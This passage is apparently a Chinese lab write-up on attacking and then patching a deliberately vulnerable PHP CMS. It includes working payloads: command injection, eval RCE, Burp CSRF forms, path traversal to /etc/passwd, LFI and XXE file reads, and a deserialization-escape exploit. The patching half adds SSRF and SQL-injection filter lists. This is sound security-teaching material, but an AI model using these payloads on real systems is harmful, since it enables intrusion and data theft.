然后就返回了php的各项信息，应该是执行了phpinfo这个函数，那么可能就是用到了eval()函数，尝试输入 data=system(&#x27;ls /&#x27;) 利用成功。 漏洞点二后台管理中存在一个采集模块，其中存在于一个“查看内网主机”，可以查看内网中的主机是否在线。查看一个主机是否在线最常用的方法就是使用ping命令，还要结合php中的shell_exec()函数。 尝试使用管道符拼接命令，造成命令执行。 payload: 127.0.0.1 | ls / 可以看到列出了根目录的文件夹，说明命令执行成功。 10.CSRF（4个）漏洞点一用户主页面–&gt;积分赠送 输入用户名和要赠送积分的数量即可赠送自己的积分 当我们通过查找用户邮箱功能获取到某个用户的邮箱时，就可以构造出一个类似于下图的网页，生成链接后通过邮箱发给受害者然后诱使其点击链接，就能神不知鬼不觉的将其积分转到自己的账号下 漏洞点二后台管理中，存在会员管理模块–&gt;点击编辑，在这里管理员可以改变会员的等级，积分和密码等。然而如果攻击者获取了更改用户等级的表单就可以精心构造出一个网页（burp可以一键生成），这个网页的功能可以将会员修改为攻击者想要的等级，或者是添加管理员。此时如果管理员不小心点击了这个链接，浏览器带着管理员登录时的cookie访问了该链接，那么服务器就认为修改会员等级的操作是管理员本人，执行该操作，从而造成攻击。 使用bp抓取该表单 username=szy&amp;nickname=szy&amp;mobile=17856276754&amp;email=263233%40qq.com&amp;password=&amp;groupid=2&amp;point=0&amp;vip=0&amp;overduedate=1970-01-01+08%3A00%3A00&amp;id=1 提交的数据中可以修改groupid, point, vip 使用bp一键生成攻击网页 生成的内容为 &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://192.168.164.147/member/member/edit.html?id=1&amp;dialog=1&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;szy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;szy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;mobile&quot; value=&quot;17856276754&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;263233&amp;#64;qq&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;groupid&quot; value=&quot;5&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;point&quot; value=&quot;1000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;vip&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;overduedate&quot; value=&quot;1970&amp;#45;01&amp;#45;01&amp;#32;08&amp;#58;00&amp;#58;00&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 复制上面的链接，使用社工的方法发送给admin，如果他在处于登录状态时点击那么攻击就成功了。 点击Submit request，就会出现更新成功的提示。查看szy，确认其等级变化 可以看到该用户的等级已经变成了高级会员，并且积分点数也变成了1000，漏洞利用成功。 漏洞点三同样是在这个页面，有一个”添加”页面，同样也是存在CSRF漏洞，如果被攻击者利用，则可以创造出大量的无用账号，从而浪费服务器的资源，可能造成dos攻击。 漏洞点四内容-&gt;稿件管理-&gt;通过审核，这里会显示所有用户提交的稿件，但是如果攻击者提交了一个含有恶意代码的稿件，又想在admin不知情的情况下让这个稿件通过审核，此时就可以创建一个恶意链接发送给admin， 内容如下 &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://192.168.164.147/cms/publish/pass.html&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;ids&amp;#91;&amp;#93;&quot; value=&quot;4&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 当admin点击后，就会让稿件通过审核 11.任意文件下载首页中存在一个图片下载模块，可以下载自己喜欢的球星壁纸 但是我们可以拦截请求，修改提交的数据 尝试下载/etc/passwd文件，输入 filename=/etc/passwd 但是出现提示文件不存在！ 尝试多输入几个../ filename=../../../../../etc/passwd 成功获取到/etc/passwd文件内容 那么就可以结合RCE漏洞，获取到该服务器上的任意文件 首先利用RCE漏洞获取到文件的完整路径，之后配合该漏洞即可实现任意文件下载。 12.unserialize该漏洞就是一个CTF题目，但是源码需要利用前面的漏洞获取 链接:http://192.168.164.147/ctf/index 根据提示是一个ctf题目，那么应该也符合一般ctf中web题目的套路。 首先查看源码 ，获取提示 但是一般的反序列化漏洞的题目都是有源码的，只有根据源码才能写出EXP。 既然没有源码，我们就需要使用之前发现的漏洞获取源码。 有五种获取源码的方法 文件上传 上传一句话木马后，可以控制服务器，可以直接到网站根目录中下载文件 LFI 使用php://filter，在文件包含漏洞的位置获取base64源码 payload： http://192.168.164.147:81/contact/index?file=php://filter/convert.base64-encode/resource=unserialize.php XXE 利用文件上传获取的路劲 payload &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///var/www/public/unserialize.php&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;f;&lt;/username&gt;&lt;info&gt;das&lt;/info&gt;&lt;/user&gt; 任意文件下载 点击即可下载到文件 RCE 首先 列出目录 127.0.0.0 | ls 读取文件 127.0.0.0 | cat unserialize.php 源码如下 &lt;?php error_reporting(0); class a &#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; echo &quot;&lt;script&gt;alert(&#x27;flag&#123;xxxxxx&#125;&#x27;)&lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;继续加油&#x27;)&lt;/script&gt;&quot;; &#125; &#125; &#125; function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string); &#125; $uname=$_POST[&#x27;payload&#x27;]; $password=1; $ser=filter(serialize(new a($uname,$password))); $test=unserialize($ser); ?&gt; 开始解题 考察点是反序列化字符逃逸 先从简单的PHP反序列化字符逃逸了解什么是反序化逃逸。 &lt;?php function filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str); &#125; class A&#123; public $name=&#x27;aaaa&#x27;; public $pass=&#x27;123456&#x27;; &#125; $AA=new A(); $res=filter(serialize($AA)); $c=unserialize($res); echo $c-&gt;pass; ?&gt; 利用反序列化逃逸修改pass的值。 正常的序列化结果 O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; s:4:&quot;aaaa&quot;s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。 例如 O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; 将4改为5，那么则认为name的值为 aaaa&quot;,此时因为前面的”无法闭合而导致反序列化失败。 而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。 例如想将pass变量的序列化字符串如下 &quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; 其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志 上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸 &lt;?php function filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str); &#125; class A&#123; public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $pass=&#x27;123456&#x27;; &#125; $AA=new A(); var_dump(serialize($AA)); $res=filter(serialize($AA)); var_dump($res); $c=unserialize($res); echo $c-&gt;pass; //echo unserialize($AA); //&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; ?&gt; //结果如下 ||为对齐 /* string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;|| string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot; hacker */ 这里pass的值就被该称了hacker 总结：逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。 而针对这道题，代码的意思大致为，POST提交一个uanme，password默认为1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是 需要构造的属性 len(&quot;;s:4:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;) =29 可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。 &quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; 上面构造出的payload长度为48因此还需要12个challenge。 exp如下 &lt;?php class a &#123; public $uname=&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;; public $password=&quot;1&quot;; &#125; function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string); &#125; $ser=filter(serialize(new a($uname,$password))); echo($ser); ?&gt; 输出的结果： O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:156:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; //easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge 长度为156 finalpayload： challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; 提交payload，获取flag 漏洞修复1.RFI代码分析代码位置application\\employee\\controller\\Index.php public function index() &#123; $file = @$_GET[&#x27;file&#x27;]; if (!isset($file) || $file == &#x27;&#x27;) &#123; $file = &#x27;info.php&#x27;; &#125; include &quot;$file&quot;; $info = []; $info = $info_1; return $this-&gt;fetch(&#x27;index&#x27;, [&#x27;info&#x27; =&gt; $info]); return view(); &#125; 这个代码很简单，就是包含了info.php文件按，并获取其中的$info参数，然后发送给前端，然后在前端显示内容。但是也很危险，因为有include函数的存在，所以存在RFI，而且对提交的参数没有任何的检查和过滤，很容易被攻击者利用 漏洞防御 方法一 修改php.ini文件，在其中添加 allow_url_open = off allow_url_include = off 构成RFI漏洞的条件十分苛刻，只有php.ini中上面两个配置项都没off才能利用该漏洞。 方法二 在代码中限制提交上的文件名，因为只需要包含about.php，所以检查提交上$file是否为about.php $file = @$_GET[&#x27;file&#x27;]; if (!isset($file) || $file == &#x27;&#x27;) &#123; $file = &#x27;info.php&#x27;; &#125; if($file !== &quot;info.php&quot;)&#123; return $this-&gt;error(&quot;文件名错误！&quot;) &#125; include &quot;$file&quot;; 2.XXE代码分析代码位置application\\advice\\controller\\Index.php public function index() &#123; $result = null; $code = 0; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); if($xmlfile !== &quot;&quot;)&#123; $dom = new DOMDocument(); // var_dump($dom); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $info = $creds-&gt;info; $conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;yzncms&quot;); if (!$conn) &#123; die(&quot;Connection failed: &quot; . mysqli_connect_error()); &#125; $sql = &quot;INSERT INTO yzn_new (name, info) values(&#x27;$username&#x27;,&#x27;$info&#x27;)&quot;; if($conn-&gt;query($sql))&#123; $code = 1; echo &quot;&lt;script&gt;alert(&#x27;提交成功！&#x27;)&lt;/script&gt;&quot;; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); &#125;else&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); &#125; &#125; 前端代码 var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;info&gt;&quot; + info + &quot;&lt;/info&gt;&lt;/user&gt;&quot;; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;/advice/index&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) &#123; var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; if(code === &quot;0&quot;)&#123; $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;fail!&quot;); &#125;else &#123; $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;success!&quot;); &#125; &#125;, &#125;); 上面的两端代码，一个是前端的数据传送，一个是后端的数据处理 可以看到前端将用户提交的数据一xml格式以post方式发送给后端，而在后端中使用了$xmlfile = file_get_contents(&#39;php://input&#39;);，可以看到这里不仅使用了file_get_contents，而且使用了php伪协议php://input，这个协议可以读取用户用post方式提交的数据，这就意味着攻击者可以使用抓包的方式修改自己所提交的数据，从而引入外部实体，造成XXE漏洞，而最主要的原因是这段代码，这个函数参数伪true时，就是禁止引入外部实体，而这里选择了false libxml_disable_entity_loader(false) 漏洞防御 方法一 使用所开发的语言提供的禁用外部实体的方法 php中的是 也就是这个漏洞的防御方法 libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); python: from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 方法二 代码层面的防御，在代码中添加对用户提交数据的检测函数 比如 &lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC 上面的关键词是XMl实体中不可缺少的关键词，所以过滤后，可以大概率的防止XXE攻击 3.SSRF代码分析代码位置application\\info\\controller\\Index.php public function index() &#123; $url = @$_GET[&#x27;url&#x27;]; if (!isset($url) || $url == &#x27;&#x27;) &#123; $url = &#x27;https://sunzy.icu&#x27;; &#125; $url = &#x27;https://sunzy.icu&#x27;; if ($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); $co = curl_exec($ch); curl_close($ch); echo $co; &#125; // return view(); &#125; 在上面的代码中，需要接收一个参数url，如果参数为空，则赋值为https://sunzy.icu，否则直接进行curl初始化，然后进行访问，可以看到没有对提交的参数进行任何的检查和过滤，这是很危险的。 漏洞防御 方法一 黑名单 内网过滤，端口限制，协议限制只允许使用http/https 在这个系统中防御该SSRF漏洞其实非常简单，就是禁止提交参数，或者绑定参数代码如下 function check_inner_ip($url) &#123; //只允许http和https协议 $match_result = preg_match(&#x27;/^(http|https)?:\\/\\/.*(\\/)?.*$/&#x27;, $url); if (!$match_result) &#123; return $this-&gt;error(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse = parse_url($url); &#125; catch (Exception $e) &#123; return $this-&gt;error(&#x27;url fomat error&#x27;); &#125; $hostname = $url_parse[&#x27;host&#x27;]; $ip = gethostbyname($hostname); $int_ip = ip2long($ip); //不允许host为内网ip地址 return ip2long(&#x27;127.0.0.0&#x27;) &gt;&gt; 24 == $int_ip &gt;&gt; 24 || ip2long(&#x27;10.0.0.0&#x27;) &gt;&gt; 24 == $int_ip &gt;&gt; 24 || ip2long(&#x27;172.16.0.0&#x27;) &gt;&gt; 20 == $int_ip &gt;&gt; 20 || ip2long(&#x27;192.168.0.0&#x27;) &gt;&gt; 16 == $int_ip &gt;&gt; 16; &#125; 方法二 对于一般的SSRF防御，一般从一下几方面入手 限制协议为HTTP、HTTPS 不用限制302重定向 设置URL白名单或者限制内网IP 限制请求的端口为http常用的端口，比如，80,443,8080,8090 下面是自己编写的WAF $url = &quot;http://baidu.com/test&quot;; if(preg_match(&quot;/file|ftp|tftp|gopher|dict|localhost|127\\.0\\.0\\.1|3232235521|2130706433|0x|0177\\.0\\.0\\.01|0\\.0\\.0\\.0|xip|@/i&quot;,$url))&#123; return $this-&gt;error(&quot;you are a hacker!!!&quot;); &#125; 解释一下为什么要用上面的正则过滤url file|ftp|tftp|gopher|dict 是让改url只能使用http/https协议，这样可以避免大部分的攻击。 localhost|127.0.0.1 是为了防止攻击者探测内网端口，以免泄露一些容易被攻击的应用程序 3232235521|2130706433|0x|0177.0.0.01|0.0.0.0 这几个是为了防止攻击者对127.0.0.1进行八进制，十六进制，十进制的转码，从而绕过之前的检测 xip|@ 这两个是防止攻击者使用302跳转攻击 4.目录遍历漏洞分析nginx.conf location /files &#123; autoindex on; alias /var/www/public/uploads/; &#125; files后少写一个/ 输入urlhttp://192.168.164.147/files../时，相当于访问的是/var/www/public/uploads/../，所以访问的就是/var/www/public/目录。 漏洞防御该漏洞修复方法很简单 修改nginx.conf location /files/ &#123; autoindex on; alias /var/www/public/uploads/; &#125;5.SQL注入漏洞点一代码分析代码位置application\\change\\controller\\Changepass.php public function index() &#123; if($this-&gt;request-&gt;isPost()) &#123; $account = $_POST[&#x27;account&#x27;]; $password = $_POST[&#x27;password&#x27;]; $npassword = $_POST[&#x27;npassword&#x27;]; $newpassword = $_POST[&#x27;newpassword&#x27;]; if($account != &#x27;&#x27; &amp;&amp; $password != &#x27;&#x27; &amp;&amp; $npassword != &#x27;&#x27; &amp;&amp; $newpassword !=&#x27;&#x27;)&#123; if($npassword === $newpassword) &#123; $result = Db::query(&quot;select `username` from yzn_member where username=&#x27;$account&#x27;&quot;); if (!empty($result)) &#123; $sql = Db::query(&quot;select `password`,`encrypt` from yzn_member where username=&#x27;$account&#x27;&quot;); $encrypt = $sql[0][&#x27;encrypt&#x27;]; $encrypt_password = $password . $encrypt; if ($sql[0][&#x27;password&#x27;] === md5($encrypt_password)) &#123; $pwd = md5($newpassword.$encrypt); $change = Db::query(&quot;UPDATE `yzn_member` SET `password`=&#x27;$pwd&#x27; WHERE username=&#x27;$account&#x27;&quot;); return $this-&gt;success(&quot;successful!&quot;); &#125; else &#123; return $this-&gt;error(&quot;wrong password!&quot;); &#125; &#125; else &#123; return $this-&gt;error(&quot;no user!&quot;); &#125; &#125; else&#123; return $this-&gt;error(&quot;new password are different!&quot;); &#125; &#125;else&#123; return $this-&gt;error(&quot;please input content!!!&quot;); &#125; &#125; 这段代码的意思就是，先检查用户的输入是否为空，不为空则判断两次输入的新密码是否一样，一样先到数据库中查找该用户，如果有该用户，则取出该用户的密码和加密因子，然后判断旧密码是否正确，正确则将新密码和加密因子的md5值写入数据库，密码修改成功。 这里可以看到并没有返回查询的信息，但是也没有对用户输入的数据进行检查和过滤，所以攻击根据错误提示进行盲注攻击。 漏洞防御 方法一 对sql注入使用的关键词进行过滤，写一个waf对输入的数据进行检查 这里的话只需要对用户名进行过滤，因为只有用户名被带入到sql语句中进行查询 function inject_check($Sql_Str) &#123;//检测Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; return $this-&gt;error(&quot;hacker!!!&quot;) &#125;else&#123; return $Sql_Str; &#125; &#125; 可以看到使用bp进行注入fuzzing，可以发现很多payload都已经被过滤 方法二 第一种方法很简单，就是限制用户名和密码的长度，然后对用户的输入进行长度限制 因为是用户名和密码位置，用户名的长度一般不会超过20个字符，密码也不会超过20个字符，那么这里只需要在用户提交完数据后，在后端检测用户名和密码的长度，这样就可以让sql注入攻击无法发挥威力，因为在20个字符范围之内很难构造出有效的攻击语句。 漏洞点二代码分析public function jifen()&#123; $msg = &quot;&quot;; $point=0; $id = $this-&gt;userid; $sql = Db::query(&quot;select `point` from yzn_member where id=&#x27;$id&#x27;&quot;)[0]; $point = (int)$sql[&#x27;point&#x27;]; if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!==&#x27;&#x27;)&#123; $username = $_POST[&#x27;username&#x27;]; $num = (int)$_POST[&#x27;num&#x27;]; if($username !== $this-&gt;userinfo[&#x27;username&#x27;] &amp;&amp; $num &lt;= $point)&#123; $result = Db::query(&quot;select `point` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; if(!empty($result))&#123; $new_point = (int)$result[&#x27;point&#x27;] + $num; $point = $point - $num; Db::query(&quot;UPDATE `yzn_member` SET `point`=&#x27;$point&#x27; WHERE id=&#x27;$id&#x27;&quot;); Db::query(&quot;UPDATE `yzn_member` SET `point`=&#x27;$new_point&#x27; WHERE username=&#x27;$username&#x27;&quot;); $msg = &quot;成功向&quot;.$username.&quot;赠送&quot;.(string)$num.&quot;积分!&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125;else&#123; $msg = &quot;不存在该用户！&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125; &#125;else&#123; $msg = &quot;注意用户名不能是自己且积分数点数需要小于自己当前积分!&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125; &#125; 在这段代码中会将用户提交的用户名带到sql语句中查询 $result = Db::query(&quot;select `point` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; 虽然此处没有返回值，但是如果查询失败就会提示$msg=&quot;不存在该用户！&quot;，导致攻击者可以使用盲注攻击 漏洞防御同样可以直接使用上面的过滤函数 漏洞点三代码分析application\\member\\controller\\Index.php中的finduser方法 public function finduser()&#123; $msg = &#x27;&#x27;; $email = &#x27;&#x27;; if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!==&#x27;&#x27;)&#123; $username = $_POST[&#x27;username&#x27;]; $deny_str = array(&#x27; &#x27;,&#x27;union&#x27;,&#x27;select&#x27;,&#x27;from&#x27;,&#x27;or&#x27;,&#x27;and&#x27;); $username = str_ireplace($deny_str,&#x27;&#x27;,$username); $result = Db::query(&quot;select `email` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; if (!empty($result))&#123; $email = $result[&#x27;email&#x27;]; $msg = &#x27;查询成功! &#x27;.$username.&#x27;的邮箱是:&#x27;; return $this-&gt;fetch(&#x27;/finduser&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;username&#x27;=&gt;$username,&#x27;email&#x27;=&gt;$email]); &#125;else&#123; $msg = &#x27;查询失败，&#x27;.$username.&#x27;不存在,请检查用户名是否正确!&#x27;; return $this-&gt;fetch(&#x27;/finduser&#x27;,[&#x27;msg&#x27;=&gt;$msg]); &#125; &#125; return $this-&gt;fetch(&#x27;/finduser&#x27;); &#125; 可以看到，对用户提交的数据进行了过滤，但是过滤的内容很少，而且很容易就被绕过 漏洞防御这里的防御就可以直接使用上面过滤函数 漏洞点四代码位置application\\member\\controller\\Content.php 代码分析$id = $this-&gt;request-&gt;param(&#x27;id&#x27;, 0); $info = Db::query(&#x27;SELECT * FROM `yzn_member_content` WHERE `uid` = &#x27;.$this-&gt;userid.&#x27; AND `id` = &#x27;.$id.&#x27; LIMIT 1&#x27;)[0]; if (empty($info)) &#123; $this-&gt;error(&#x27;稿件不存在！&#x27;); &#125; 这里直接将用户提交的数据id，带入到sql语句中查询，并且没有进行过滤 漏洞防御方法一 因为id是一个数字，那么直接对id这个参数进行限制，只允许用户提交数字型数据 if(!is_numeric($id))&#123; return $this-&gt;error(&quot;id必须是数字！&quot;) &#125; 方法二 与上面的方法二一样，对id参数进行过滤 6.暴力破解代码分析该漏洞存在于管理员后台登录，造成该漏洞的原因大多是因为管理人员没有修改初始密码，或者心存侥幸改成了比较常见的密码，这样就给了攻击者可乘之机，直接使用暴力破解就可以攻克后台管理页面。 代码位于application\\admin\\controller\\Index.php中的login()方法 //登录判断 public function login() &#123; $url = $this-&gt;request-&gt;get(&#x27;url&#x27;, &#x27;index/index&#x27;); if (User::instance()-&gt;isLogin()) &#123; $this-&gt;redirect(&#x27;admin/index/index&#x27;); &#125; if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(); $keeplogin = $this-&gt;request-&gt;post(&#x27;keeplogin&#x27;); // 对提交数据进行检查 $rule = [ &#x27;username|用户名&#x27; =&gt; &#x27;require|alphaDash|length:3,20&#x27;, &#x27;password|密码&#x27; =&gt; &#x27;require|length:3,20&#x27;, &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; $result = $this-&gt;validate($data, $rule); if (true !== $result) &#123; $this-&gt;error($result, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; if (User::instance()-&gt;login($data[&#x27;username&#x27;], $data[&#x27;password&#x27;], $keeplogin ? 86400 : 0)) &#123; $this-&gt;success(&#x27;恭喜您，登陆成功&#x27;, url(&#x27;admin/Index/index&#x27;)); &#125; else &#123; $msg = User::instance()-&gt;getError(); $msg = $msg ? $msg : &#x27;用户名或者密码错误!&#x27;; $this-&gt;error($msg, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; &#125; else &#123; if (User::instance()-&gt;autologin()) &#123; $this-&gt;redirect(&#x27;admin/index/index&#x27;); &#125; return $this-&gt;fetch(); &#125; &#125; 虽然每次登录都需要带有token，但是也是不安全的，因为token的值是可以从前端页面获取的 漏洞防御防御方法就是限制管理员登录时密码输入的错误次数，当错误次数达到一定数量时，就锁定该账号，需要拥有数据库管理权限的真正管理员才能重新登录。 首先在数据库中创建一个表yzn_loginfo，里面只需要一个字段，用来记录admin账号连续输入错误密码的次数。 具体方法为 首先进入mysql容器内部 docker exec -it ed1c19bb4a95 bash 之后登录root账号，在数据库中建立一张表 CREATE TABLE IF NOT EXISTS `yzn_loginfo` ( `login_fail` int(10) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8; 修改代码application\\admin\\controller\\Index.php中的login()方法 其中戴// 是增加的代码 // 从yzn_loginfo表中获取到 login_fail的值 $login_fail = Db::query(&#x27;SELECT * FROM `yzn_loginfo`&#x27;)[0]; // $login_fail_count = $login_fail[&#x27;login_fail&#x27;]; // // 如果密码错误超过 5 则锁定账号 if($login_fail_count &gt;= 5)&#123; // $msg = &quot;账号被锁定，请联系网站管理员！&quot;; // $this-&gt;error($msg,$url); // &#125; if (User::instance()-&gt;login($data[&#x27;username&#x27;], $data[&#x27;password&#x27;], $keeplogin ? 86400 : 0)) &#123; // 如果输入的密码正确，说明是真正的admin，将login_fail值更新为0 Db::query(&#x27;UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`=&#x27;.$login_fail_count); // $this-&gt;success(&#x27;恭喜您，登陆成功&#x27;, url(&#x27;admin/Index/index&#x27;)); &#125; else &#123; $msg = User::instance()-&gt;getError(); $msg = $msg ? $msg : &#x27;用户名或者密码错误!&#x27;; // 如果输入的密码不正确，则将login_fail的值+1后再到数据库中更新 $login_fail_count_new = $login_fail_count + 1; // Db::query(&#x27;UPDATE `yzn_loginfo` SET `login_fail`= &#x27;.$login_fail_count_new.&#x27; WHERE `login_fail`=&#x27;.$login_fail_count); // $this-&gt;error($msg, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; 当连续输错五次密码时，账号就被锁定，此时没有任何人能够登录，必须到数据库中需改yzn_loginfo的login_fail的值，这也就达到了防止暴力破解的攻击。 即执行下面这个sql语句 UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`= 5; 7.文件上传漏洞点一代码分析application\\member\\controller\\Index.php 中的photo方法 public function photo()&#123; $msg = &#x27;&#x27;; 